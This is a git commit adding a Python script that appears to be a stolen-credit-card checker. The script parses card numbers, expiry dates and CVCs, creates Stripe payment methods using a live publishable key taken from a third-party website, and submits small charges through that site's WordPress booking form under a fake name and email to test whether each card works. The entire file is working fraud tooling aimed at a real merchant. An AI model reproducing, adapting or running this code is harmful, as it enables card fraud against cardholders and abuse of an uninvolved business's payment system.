c4018073e2b75f72c3d170b00abc5606370714e7
hanpyeaphyo <hanpyeaphyo@gmail.com>
2024-10-19 08:26:34 +0630

    Add files via upload

---
+++ ggg.py
@@ -0,0 +1,74 @@
+import requests,re
+def Tele(ccx):
+	import requests
+	ccx=ccx.strip()
+	n = ccx.split("|")[0]
+	mm = ccx.split("|")[1]
+	yy = ccx.split("|")[2]
+	cvc = ccx.split("|")[3]
+	if "20" in yy:#Mo3gza
+		yy = yy.split("20")[1]
+	r = requests.session()
+
+	headers = {
+			'authority': 'api.stripe.com',
+			'accept': 'application/json',
+			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+			'content-type': 'application/x-www-form-urlencoded',
+			'origin': 'https://js.stripe.com',
+			'referer': 'https://js.stripe.com/',
+			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+			'sec-ch-ua-mobile': '?1',
+			'sec-ch-ua-platform': '"Android"',
+			'sec-fetch-dest': 'empty',
+			'sec-fetch-mode': 'cors',
+			'sec-fetch-site': 'same-site',
+			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+	}
+
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&key=pk_live_51KigSfCPln27C4EmfOhhQpM0Ypdgk6MOvvj1PxqmzFg9haWYVDAo4fmwnxAtjD5Uy5xbRnfhXdMEvG1KumQfSfOs00KflBHGPx'
+	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+
+	pm = r1.json()['id']
+
+	cookies = {
+			'__stripe_mid': '9b423c2b-15e5-47af-948b-d3e6394b77becd0fde',
+			'__stripe_sid': '78f14b59-1d49-435f-bfc4-fbbe8931413cd2234f',
+	}
+
+	headers = {
+			'authority': 'kimsharris.com',
+			'accept': '*/*',
+			'accept-language': 'en-US,en;q=0.9,my;q=0.8',
+			'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+			# 'cookie': '__stripe_mid=cd04496a-fc78-49f6-99fc-6310e3e55e6221dc47; __stripe_sid=b3b7888f-21a6-4ff7-a3cf-b0242d6fcf37cce97e',
+			'origin': 'https://kimsharris.com',
+			'referer': 'https://kimsharris.com/book/',
+			'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+			'sec-ch-ua-mobile': '?1',
+			'sec-ch-ua-platform': '"Android"',
+			'sec-fetch-dest': 'empty',
+			'sec-fetch-mode': 'cors',
+			'sec-fetch-site': 'same-origin',
+			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+			'x-requested-with': 'XMLHttpRequest',
+	}
+
+	params = {
+			't': '1728174029261',
+	}
+
+	data = {
+			'data': '__fluent_form_embded_post_id=1076&_fluentform_4_fluentformnonce=e5e6b5a709&_wp_http_referer=%2Fbook%2F&names%5Bfirst_name%5D=Rein%2066&email=rein48287%40gmail.com&payment_input=5&payment_method=stripe&payment-coupon=&__ff_all_applied_coupons=&__stripe_payment_method_id='+str(pm)+'',
+			'action': 'fluentform_submit',
+			'form_id': '4',
+	}
+	
+	r2 = requests.post(
+			'https://kimsharris.com/wp-admin/admin-ajax.php',
+			params=params,
+			cookies=cookies,
+			headers=headers,
+			data=data,
+	)
+	return (r2.json())
